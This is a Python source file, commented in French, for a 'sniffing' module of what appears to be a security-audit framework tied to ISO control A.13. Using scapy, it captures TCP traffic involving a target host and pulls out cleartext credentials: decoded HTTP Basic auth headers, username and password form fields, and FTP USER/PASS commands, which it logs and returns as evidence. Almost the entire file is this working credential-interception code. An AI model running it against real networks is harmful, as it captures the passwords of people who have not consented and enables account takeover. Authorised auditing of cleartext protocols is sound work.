from __future__ import annotations

import base64
import logging
import os
import re

from scapy.all import IP, Raw, TCP, sniff

from ..core.plugin_base import AttackModule, AttackResult
from ..core.registry import register

logger = logging.getLogger(__name__)
_BASIC_AUTH_RE = re.compile(rb"Authorization:\s*Basic\s+([A-Za-z0-9+/=]+)", re.IGNORECASE)
_FORM_FIELD_RE = re.compile(rb"(?:user(?:name)?|login|pass(?:word)?)=([^&\s\r\n]+)", re.IGNORECASE)
_FTP_CRED_RE = re.compile(rb"^(USER|PASS)\s+(.+)$", re.IGNORECASE | re.MULTILINE)


def _is_root() -> bool:
    return hasattr(os, "geteuid") and os.geteuid() == 0


def _extract_credentials(payload: bytes) -> list[dict[str, str]]:
    """Cherche des identifiants en clair dans un payload TCP capturé.
    Retourne une liste (potentiellement vide) de findings structurés.
    """
    findings: list[dict[str, str]] = []

    for match in _BASIC_AUTH_RE.finditer(payload):
        try:
            decoded = base64.b64decode(match.group(1)).decode(errors="ignore")
        except Exception:
            continue
        findings.append({"type": "http_basic_auth", "valeur": decoded})

    for match in _FORM_FIELD_RE.finditer(payload):
        findings.append(
            {"type": "formulaire_http", "valeur": match.group(0).decode(errors="ignore")}
        )

    for match in _FTP_CRED_RE.finditer(payload):
        findings.append(
            {
                "type": f"ftp_{match.group(1).decode().lower()}",
                "valeur": match.group(2).decode(errors="ignore").strip(),
            }
        )

    return findings


@register
class SniffingModule(AttackModule):
    name = "sniffing"
    iso_controls = ("A.13",)
    requires_confirmation = True

    def run(
        self,
        target: str,
        interface: str | None = None,
        duration: float = 30.0,
        max_packets: int = 0,
        **kwargs,
    ) -> AttackResult:
        if not _is_root():
            return AttackResult(
                module_name=self.name,
                success=False,
                summary=(
                    "Privilèges insuffisants : ce module a besoin d'un accès "
                    "raw socket (root/administrateur) pour capturer le trafic."
                ),
                evidence={},
            )

        findings: list[dict[str, str]] = []
        packets_seen = 0

        def _handle(pkt) -> None:
            nonlocal packets_seen
            packets_seen += 1
            if not (pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt.haslayer(Raw)):
                return
            payload = bytes(pkt[Raw].load)
            for finding in _extract_credentials(payload):
                finding["src_ip"] = pkt[IP].src
                finding["dst_port"] = pkt[TCP].dport
                findings.append(finding)
                logger.info(
                    "Identifiant en clair intercepté (%s) depuis %s",
                    finding["type"],
                    finding["src_ip"],
                )

        sniff_kwargs = dict(
            filter=f"host {target} and tcp",
            prn=_handle,
            iface=interface,
            timeout=duration,
            store=False,
        )
        if max_packets > 0:
            sniff_kwargs["count"] = max_packets

        try:
            sniff(**sniff_kwargs)
        except PermissionError as exc:
            return AttackResult(
                module_name=self.name,
                success=False,
                summary=f"Erreur de permission lors de la capture : {exc}",
                evidence={},
            )
        except OSError as exc:
            return AttackResult(
                module_name=self.name,
                success=False,
                summary=f"Erreur réseau (interface invalide ?) : {exc}",
                evidence={"interface": interface},
            )

        if findings:
            summary = (
                f"{len(findings)} identifiant(s) en clair intercepté(s) sur "
                f"{packets_seen} paquet(s) capturé(s) impliquant {target}."
            )
        else:
            summary = (
                f"Aucun identifiant en clair détecté sur {packets_seen} "
                f"paquet(s) capturé(s) impliquant {target}."
            )

        return AttackResult(
            module_name=self.name,
            success=bool(findings),
            summary=summary,
            evidence={
                "target": target,
                "interface": interface,
                "paquets_captures": packets_seen,
                "identifiants_trouves": findings,
            },
        )